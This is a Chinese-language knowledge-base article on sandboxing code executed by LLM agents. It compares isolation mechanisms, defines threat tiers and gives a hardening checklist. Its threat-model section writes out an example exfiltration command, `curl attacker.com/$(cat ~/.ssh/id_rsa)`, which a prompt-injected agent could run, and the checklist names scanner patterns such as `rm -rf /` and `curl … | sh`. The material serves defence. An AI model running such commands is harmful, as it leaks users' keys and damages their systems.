---
title: Sandbox Isolation
aliases: [沙箱, 代码执行沙箱, code execution sandbox, run_python isolation]
category: L1
created: 2026-04-19
updated: 2026-06-09
relations:
  - target: "[[tool-system]]"
    type: depends_on
    evidence: "run_python / bash / code_interpreter 是 tool-system 里最高风险的一类 tool，其隔离机制决定了 agent 整体安全性上限"
  - target: "[[channel-remote]]"
    type: feeds
    evidence: "一旦 agent 通过 HTTP/WS 暴露给外部用户，威胁模型从'本机单用户'跳到'多租户 SaaS'，沙箱需求从可选变必需"
  - target: "[[runtime-state]]"
    type: uses
    evidence: "持久 kernel / workspace 模式（E2B、AgentScope Workspace）需要把沙箱会话绑到 runtime session 生命周期，创建/暂停/销毁协调"
sources: [agentscope, deer-flow, openinterpreter, e2b, daytona, modal, pyodide, langchain, autogen, neoagent]
---

## 一句话定义

隔离 LLM 授权执行的代码（`run_python`、`bash`、`code_interpreter`），防止它越权访问宿主资源、窃取密钥、攻击其他租户。

## 核心问题

- LLM 被 prompt injection 注入恶意指令时，工具调用就是攻击载荷——`run_python` 能读 `/etc/passwd`、能 `curl attacker.com/$(cat ~/.ssh/id_rsa)`、能 SSRF 撞云元数据服务
- 什么时候"subprocess 够用"，什么时候必须上容器/微 VM
- 多租户环境下一个租户的代码能不能影响另一个租户
- 性能 vs 安全 vs 包生态兼容性的三角取舍

## 威胁模型分层

沙箱选型**从威胁模型倒推**，不是"越强越好"。四档典型场景：

| Tier | 场景 | 假设 | 最低隔离要求 |
|---|---|---|---|
| T1 | 单用户本地、LLM 可信、无外部输入 | 代码作者是你自己 | subprocess + timeout + 确认 |
| T2 | 单用户本地、LLM 可能被网页/PDF 注入 | LLM 被劫持但物理机可信 | 容器边界（Docker + cap-drop + seccomp），网络默认禁 |
| T3 | 多租户 SaaS、外部用户 | 租户互不信任，主动对抗 | 内核级隔离（gVisor / microVM），默认断网 + 元数据 IP 黑名单 |
| T4 | 浏览器零信任、无服务端成本 | 代码跑在用户端 | WASM（Pyodide/JupyterLite） |

Docker 单独不够 T3——已知容器逃逸漏洞 + 共享宿主 kernel syscall 面。T3 必须换内核（gVisor 用户态内核 或 Firecracker 微 VM）。

## 各家对比

| 项目 | 机制 | FS 隔离 | 网络隔离 | CPU/内存限制 | 启动延迟 | 状态 | 包生态 |
|------|------|---------|----------|--------------|----------|------|--------|
| AgentScope Python `LocalWorkspace` | 本地 Bash/Edit/Glob/Grep/Read/Write 直接暴露 | workspace workdir | 无 | 无 | instant | session workspace | 宿主 |
| AgentScope Python `DockerWorkspace` | 容器内 MCP gateway + bearer token | 容器 workdir | 容器网络 | Docker 配置 | 秒级 | session workspace | 容器内工具 |
| AgentScope Python `E2BWorkspace` | 远程沙箱 workspace | 远程沙箱 | 远程沙箱 | E2B 服务决定 | 服务决定 | session workspace | E2B 环境 |
| DeerFlow `AioSandboxProvider` | Docker 容器（`/mnt/user-data/{uploads,workspace,outputs}`） | 每任务独立目录 | 容器 | 容器默认 | 秒级 | 无状态 | 镜像决定 |
| DeerFlow `LocalSandboxProvider` | 宿主 + 线程隔离目录 | 弱 | 无 | 无 | instant | 无状态 | 宿主 |
| OpenInterpreter | 宿主进程内 Jupyter kernel（`JupyterLanguage`） | 无 | 无 | 无 | instant | 进程级持久 | 宿主全量 |
| E2B | Firecracker microVM + Jupyter + Nomad/Consul 编排 | 整 VM | 整 VM | VM 级 | ~150ms | `pause()/resume()` 持久到磁盘 | 完整 Linux + pip |
| Daytona | 未公开（Docker 兼容，snapshot API） | 容器 | 容器 | 容器 | <90ms（预热池） | snapshot 持久 | 完整 Linux |
| Modal Sandbox | 容器（疑为 gVisor） | 容器 | tunnels | CPU/mem/disk API | 秒级 | FS snapshot | 自定义镜像 |
| Pyodide/JupyterLite | CPython → WASM，跑在浏览器 | MEMFS 内存 FS | 仅 fetch、CORS 受限 | 浏览器强制 | 秒级（加载） | 标签页级 | WASM 轮子，无任意 C 扩展 |
| LangChain `PythonREPLTool` | 裸 `exec(code, globals, locals)` | **无** | **无** | 可选 multiprocessing timeout | instant | globals 持久 | 宿主全量 |
| AutoGen `DockerCommandLineCodeExecutor` | Docker + 宿主 bind mount | 弱（RW 挂载） | 默认 bridge | 无 | 秒级 | 无状态 | `python:3-slim` |
| **neoagent** (本知识库 SDK) | `subprocess_exec` + tempdir + 环境变量白名单 + pgid SIGKILL | 仅 cwd | 无 | 无 | instant | 无状态 | 宿主 venv（`sys.executable`） |

### 关键观察

- **LangChain PythonREPLTool** 是反面教材——裸 `exec()` 在主进程里跑，任何 LLM 注入直接命中你的 agent 进程
- **OpenInterpreter** 默认把 LLM 代码塞进进程内 Jupyter kernel，连 T1 都谈不上真正隔离，只靠"每次弹确认框"做用户把关
- **AutoGen Docker 执行器**：默认 root 用户、无网络限制、无 seccomp——本质是"清理边界"（exec 后容器销毁）而不是"安全边界"
- **AgentScope Python 2.x 的重点是 workspace 作为权限边界**：Local/Docker/E2B 三类 workspace 决定工具如何暴露，ChatService 把 workspace workdir 注入 permission context。Docker workspace 通过容器内 MCP gateway 暴露工具，比“每个工具自己接收 cwd 参数”更适合 Web/distributed agent。
- **E2B** 把持久化玩到极致：`pause()` 把整个 microVM 序列化到磁盘，`resume()` 秒级恢复，成本接近 0 ——多租户长会话的经济学模型
- **neoagent 的独特取舍**：subprocess 弱沙箱 + 环境变量白名单（drop API key）+ 进程组 SIGKILL。对自用 T1 场景够轻；对 T3 必须外层再套容器/微 VM。

## 设计权衡

### 方案对比

| 方案 | 核心思路 | 适合场景 | 代表项目 |
|------|----------|----------|----------|
| subprocess + env/cwd 白名单 | 依赖 OS 进程边界，过滤环境变量和工作目录 | T1 自用，信任链短 | neoagent |
| Docker + cap-drop + seccomp | 共享宿主 kernel，但用 capability/syscall 减法收紧 | T2 本地且 LLM 半可信 | AutoGen、DeerFlow AioSandbox、AgentScope DockerWorkspace |
| gVisor 用户态内核 | 重写 Linux syscall 子集（Sentry），宿主 kernel 对容器暴露面极小 | T3 多租户，启动要快、OCI 生态 | Modal、Google Cloud Run |
| Firecracker microVM | 真·硬件虚拟化，每沙箱一个微型 VM | T3 极致隔离 + 持久化需求 | E2B |
| WASM | 编译到 WebAssembly，浏览器沙箱原生隔离 | T4 浏览器侧零服务端 | Pyodide、JupyterLite |
| IPython kernel per session | 进程/容器内挂 Jupyter kernel，状态跨调用保留 | 多轮交互体验（配合上述隔离层使用） | E2B、OpenInterpreter |

### 交叉维度

- **启动延迟**：subprocess/local workspace ~instant < gVisor（warm pool）~ms < Firecracker ~150ms < 冷启动容器 秒级 < WASM 加载 秒级
- **隔离强度**：裸 exec « subprocess « Docker « Docker+gVisor ≈ Firecracker « WASM（语义上最强，但功能受限）
- **包生态**：宿主 Python（subprocess、Docker 自定义镜像、Firecracker VM）100% > WASM（限于预编译轮子，无 libzbar 这类原生依赖）
- **状态持久化**：无状态（subprocess per call）< FS snapshot（Modal） < 进程级持久 kernel（IPython）< 整 VM pause/resume（E2B）

## 分层硬化清单（正交于机制选择）

以下 13 条是**独立于沙箱档次**都可以/应该叠加的硬化项。没有其中任何一条，再强的沙箱都可能泄漏：

1. **云元数据 IP 出口屏蔽** —— 169.254.169.254（AWS/GCP IMDS）、fd00:ec2::254、metadata.google.internal。**SSRF 单点最大向量**
2. **网络默认禁出 + 按需白名单** —— agent 需要访问 PyPI + HF 就只放这两条，不给 `0.0.0.0/0`。iptables / eBPF / Docker 自定义网络
3. **非 root UID + `--cap-drop=ALL`** —— AutoGen 默认 root，这是坑
4. **Seccomp 白名单 profile** —— Docker 默认 seccomp 很宽，堵掉 `ptrace`/`mount`/`unshare`/`bpf`/`keyctl`/`pivot_root`
5. **只读 rootfs + tmpfs workdir** —— 只有 `/workspace` 可写，其它 RO
6. **subprocess env 白名单** —— 永远别透传 `AWS_*` / `OPENAI_API_KEY` / raw `os.environ`，明确列放行项
7. **PIDs + 内存 + CPU cgroup 限制** —— fork bomb 防御。AutoGen、LangChain REPL 都没做
8. **输出大小上限 + 超时** —— 防日志洪泛外泄 + CPU DoS
9. **预热池 + 心跳回收** —— Daytona 等托管沙箱标配，sub-second 启动不牺牲隔离
10. **持久 kernel ≠ 持久租户** —— E2B 在 session 内保留 Jupyter 状态，session 结束整 VM 销毁。好的默认
11. **exec 前静态扫描**（可选） —— OpenInterpreter Safe Mode 用 semgrep 扫 `rm -rf /`、`curl … | sh` 等模式
12. **出口代理 MIME 强制** —— DeerFlow 把 HTML/SVG 强制 Content-Disposition: attachment，防 sandbox 吐回带 XSS 的内容被渲染
13. **pause/resume 替代 kill** —— E2B 模式：空闲沙箱暂停到磁盘，下次唤醒。长会话经济学最优

## gVisor 专题

在 T3 多租户场景，**gVisor 是 Docker 和 Firecracker 之间的务实选择**。

### 核心思想

Docker 用 Linux namespaces + cgroups + seccomp——容器进程发的 syscall 最终还是**宿主 kernel** 处理。一旦 kernel 有漏洞（Dirty Cow、Dirty Pipe 等），容器逃逸就是现实威胁。

gVisor 换思路：用 Go **在用户态重写了一个 Linux 内核子集**，叫 **Sentry**。容器里的 syscall 被拦截送到 Sentry，由 Sentry 模拟语义。Sentry 和宿主 kernel 交互时只用一个极小的 syscall 白名单（~50 个 vs Linux 的 350+）。

> **一句话：Docker 隔离的是进程；gVisor 替换了进程对话的那个"内核"。**

### 架构

- **Sentry** —— 用户态内核，处理 syscall、内存、信号、`/proc`、自带 netstack（Go 写的 TCP/IP 栈）
- **Gofer** —— 文件系统代理，Sentry 不能直接 open 宿主文件，所有 FS 走 9P/LISAFS 到 Gofer
- **runsc** —— OCI 兼容 runtime，替换 `runc`。`docker run --runtime=runsc ...` 一行切换

### 代价

- **性能**：syscall 密集型慢 2-5x（每次多一次用户态-用户态来回 + Go 调度）；CPU-bound 纯算几乎无感
- **Syscall 覆盖率非 100%**：罕见 ioctl、部分 `io_uring`、某些 `perf_event` 返回 `ENOSYS`
- **不支持**：GPU passthrough（nvproxy 有限）、KVM 嵌套、FUSE 有限

### 生产使用

Google App Engine / Cloud Run / Cloud Functions、GKE Sandbox（RuntimeClass）、许多在线 IDE/notebook 产品

### 选型对比

| 对比 | 什么时候选 gVisor |
|---|---|
| vs 纯 Docker | LLM 代码作者不可信 → gVisor 几乎必选 |
| vs Firecracker | 需要快启动 + OCI 生态无缝 → gVisor 胜；极致硬件级隔离 → Firecracker 胜 |
| vs seccomp+cap-drop | 当 seccomp 白名单越收越窄开始怀疑自己漏了啥时，就是上 gVisor 的临界点 |

## 相关概念

- [[tool-system]] —— 沙箱执行的代码是作为 tool 被调用的
- [[channel-remote]] —— HTTP/WS 暴露后威胁模型跳档
- [[runtime-state]] —— 持久 kernel 模式和 session 生命周期绑定
- [[context-management]] —— 沙箱执行结果经常是大输出，触发压缩/free 机制

## L2 详情

- [[sandbox-isolation--agentscope]] — Python 2.x workspace / permission context / Docker MCP gateway

## 参考来源

- gVisor 架构：https://gvisor.dev/docs/architecture_guide/
- gVisor 兼容性：https://gvisor.dev/docs/user_guide/compatibility/
- E2B infra：https://github.com/e2b-dev/infra
- Pyodide 约束：https://pyodide.org/en/stable/usage/wasm-constraints.html
- Modal Sandbox：https://modal.com/docs/guide/sandbox
- OpenInterpreter Safe Mode：`docs/SAFE_MODE.md`
- AutoGen Docker 执行器：`autogen_ext/code_executors/docker/_docker_code_executor.py`
- LangChain Python REPL（反面教材）：`langchain_experimental/utilities/python.py`
- AgentScope Python 2.x workspace：`src/agentscope/workspace/`、`src/agentscope/permission/`
- DeerFlow 沙箱 README security 段
